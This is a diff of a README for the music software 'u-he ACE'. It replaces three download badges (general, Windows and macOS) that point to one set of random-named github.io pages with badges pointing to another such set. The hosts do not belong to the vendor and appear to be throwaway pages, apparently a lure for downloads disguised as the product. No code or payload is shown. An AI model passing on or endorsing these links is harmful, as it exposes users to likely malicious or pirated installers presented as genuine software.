@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download u-he ACE](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_U-HE_ACE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://iggoiiltktso.github.io/win-installer/)
+[![Download u-he ACE](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_U-HE_ACE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mjztsbomuptb.github.io/windows-dl/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **u-he ACE** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-37474F?style=for-the-badge&logo=windows&logoColor=white)](https://iggoiiltktso.github.io/win-installer/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-37474F?style=for-the-badge&logo=apple&logoColor=white)](https://iggoiiltktso.github.io/mac-get/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-37474F?style=for-the-badge&logo=windows&logoColor=white)](https://mjztsbomuptb.github.io/windows-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-37474F?style=for-the-badge&logo=apple&logoColor=white)](https://mjztsbomuptb.github.io/macos-dl/)
 
 </div>
 
